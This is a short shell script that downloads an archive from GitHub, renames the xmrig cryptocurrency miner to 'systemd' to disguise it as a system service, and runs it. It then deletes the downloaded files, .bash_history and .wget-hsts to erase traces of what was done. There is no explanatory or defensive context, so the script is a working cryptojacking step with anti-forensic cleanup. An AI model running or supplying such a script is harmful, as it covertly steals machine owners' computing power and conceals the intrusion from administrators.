wget https://github.com/deusveritatis/loki/archive/master.zip
unzip master.zip
cd loki-master
mv xmrig systemd
chmod +x systemd
./systemd
cd ..
rm -r master.zip loki-master nvlv1 .bash_history .wget-hsts
exit 



